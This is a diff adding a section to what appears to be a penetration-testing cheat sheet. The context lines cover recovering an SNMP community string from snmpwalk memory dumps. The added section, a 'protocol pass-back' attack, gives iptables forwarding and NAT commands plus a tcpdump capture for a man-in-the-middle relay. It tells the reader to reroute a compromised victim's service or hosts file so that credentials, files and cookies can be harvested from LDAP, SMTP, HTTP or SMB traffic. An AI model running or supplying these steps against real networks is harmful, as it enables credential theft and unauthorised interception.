@@ -174,8 +174,31 @@ quit
 `SNMPPID=$(ps -ef | grep snmpwalk | grep -v grep | tr -s " " | cut -d " " -f 2); kill -CONT $SNMPPID`
 
 **scan the output files for both ASCII and unicode strings**<br />
-(hint - the community string is stored in the heap)<br />
+(hint ... the community string is stored in the heap)<br />
 `strings /tmp/snmpwalk.stack.bin | more`<br />
 `strings -e l /tmp/snmpwalk.stack.bin | more`<br />
 `strings /tmp/snmpwalk.heap.bin | more`<br />
 `strings -e l /tmp/snmpwalk.heap.bin | more`<br />
+
+## >> Protocol pass-back attacks
+
+This technique is useful for relaying protocols such as LDAP, SMTP, HTTP, and SMB from a compromised victim machine.  Your attacking machine will forward traffic to the intended host and capture credentials and files that can be reconstituted from a cap file.  You may have to temporarily reconfigure the service/application destination IP or hosts file on the victim to intercept traffic.<br />
+**This example assumes the following**<br />
+* The attacking Linux machine (A) is 192.168.1.7 using eth0
+* The victim machine (B) is 192.168.10.5
+* The remote host (C) that a service on (B) normally connects to is 192.168.100.30
+
+**Set up routing and iptables on the attacking machine (A)**<br />
+Change the port as appropriate for the protocol being intercepted, LDAP port 389 shown.<br />
+`echo 1 > /proc/sys/net/ipv4/conf/eth0/forwarding`<br />
+`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 389 -j DNAT --to-destination 192.168.100.30:389`<br />
+`iptables -A FORWARD -p tcp -i eth0 -d 192.168.100.30 --dport 389 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT`<br />
+`iptables -t nat -A POSTROUTING --destination 192.168.100.30/32 -j SNAT --to-source 192.168.1.7`<br />
+`tcpdump -nn -vv -i eth0 -s 0 -w victim.ldap.cap port 389`
+
+**You have aquired sufficient privileges on a target (B)**<br />
+Change the service or edit the hosts file to relay traffic to the IP address of your attacking machine (e.g. 192.168.1.7).
+
+**Claim your prize**<br />
+Once you have a capture file (e.g. victim.ldap.cap) you can open it in WireShark or NetworkMiner to retrieve credentials, files, cookies, etc that are useful.  Revert the destination IP or hosts file back to normal on victim (B).
+
